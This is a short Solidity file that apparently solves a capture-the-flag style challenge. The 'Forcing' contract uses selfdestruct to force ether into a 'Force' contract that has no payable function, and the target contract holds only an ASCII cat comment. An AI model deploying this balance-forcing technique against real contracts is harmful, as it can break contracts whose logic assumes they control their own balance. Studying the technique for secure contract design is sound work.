// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Forcing {

    Force force;

    constructor(address _force) {
        force = Force(_force);
    }

    function forceBalance() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
    
    
}